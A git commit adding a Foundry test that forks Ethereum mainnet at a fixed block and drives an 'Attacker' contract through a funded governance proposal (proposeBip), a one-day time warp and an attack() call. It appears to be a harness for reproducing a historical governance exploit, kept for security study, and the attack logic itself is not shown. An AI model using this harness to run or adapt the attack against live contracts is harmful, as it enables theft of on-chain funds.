69a15b9cede64ad1a7bc33cbd7bb327342330a6b
dadsec-dev <secdad1@gmail.com>
2023-04-10 16:33:15 +0100

    updated interface file

---
+++ test/Attack.t.sol
@@ -0,0 +1,23 @@
+pragma solidity ^0.8.13;
+ 
+import "forge-std/Test.sol";
+import "../src/Attack.sol";
+ 
+contract AttackerTest is Test {
+   function setUp() public {
+       vm.createSelectFork("mainnet", 14595905);
+       vm.deal(address(this), 70 ether);
+   }
+ 
+   function testAttack() public {
+       Attacker attacker = new Attacker();
+ 
+       attacker.proposeBip{value: 70 ether}();
+ 
+       console.log("Proposal created, warping, %", block.timestamp);
+       vm.warp(block.timestamp + 1 days);  // travelling 1 day in the future
+       console.log("Warped, %s", block.timestamp);
+      
+       attacker.attack();
+   }
+}
